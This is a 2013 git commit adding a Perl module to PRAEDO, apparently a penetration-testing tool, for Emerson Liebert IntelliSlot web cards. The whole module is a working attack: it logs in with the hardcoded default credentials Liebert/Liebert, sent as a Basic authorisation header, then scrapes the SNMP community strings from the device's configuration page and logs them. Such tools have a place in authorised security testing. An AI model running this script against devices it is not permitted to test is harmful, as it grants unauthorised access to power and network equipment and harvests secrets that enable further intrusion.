a5f57588a7bdf66fe9754d86e68057a3878f3f99
Deral Heiland <dh@layereddefense.com>
2013-04-18 14:51:31 -0400

    Add and update module for Emerson Network Power IntelliSlot Web Card to support default cred checks and snmp community string extraction

---
+++ jobs/MA0016.pl
@@ -0,0 +1,69 @@
+# Emerson Liebert Network Power IntelliSlot Card  default password test
+# 
+######################################################
+#                  PRAEDO Module #MA0016             #
+#          Copyright (C) 2013 Foofus.net	     #
+#              Deral Heiland    "percX"              # 
+######################################################
+package MA0016;
+sub MA0016
+{
+ 
+# Set global variables
+my $TARGET = $_[1];
+my $PORTS = $_[2];
+my $web = $_[3];
+my $OUTPUT = $_[4];
+my $LOGFILE = $_[5];
+
+
+# Open output file and setup browser LWP function 
+open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
+print "\n**********Default credential check on Emerson IntelliSlot Card $TARGET : JOB MA0016**********\n";
+print OUTFILE "\n**********Default credential check on Emerson IntelliSlot Card  $TARGET : JOB MA0016**********\n";
+
+my $browser = LWP::UserAgent->new(timeout => 120);
+$browser->default_header(Authorization=> "Basic TGllYmVydDpMaWViZXJ0");
+
+
+# Test  For Default Password
+
+     my $response = $browser->get("http$web://$TARGET:$PORTS/config/configSnmpAccess.htm",);
+
+my $content = $response->content();
+     
+if ($content =~ /Device Configuration - SNMP Access/)
+        {
+            print "SUCCESS : username=Liebert : password=Liebert\n";
+            print OUTFILE "SUCCESS : username=Liebert : password=Liebert\n";
+
+	    	my $html = HTML::TagParser->new($content);
+                my @list = $html->getElementsByTagName( "input" );
+    			foreach my $elem ( @list )
+        			{
+         			 my $text1 = $elem->getAttribute("name");
+         			 my $text2 = $elem->getAttribute("value");
+                 		    if (($text1 =~ /accessCommunityString/) && ($text2 ne //))
+                     			{
+                       			   print "SNMP community String = $text2\n";
+                       			   print OUTFILE "SNMP Read community String = $text2\n";
+                     			}
+                  	            else
+                    			{
+                   			}
+				}
+
+        }
+        else 
+        { 
+           print "FAILED \n";
+           print OUTFILE "FAILED \n";
+        } 
+
+
+# operation completed close out output files
+close(OUTFILE);
+
+}
+		
+1;
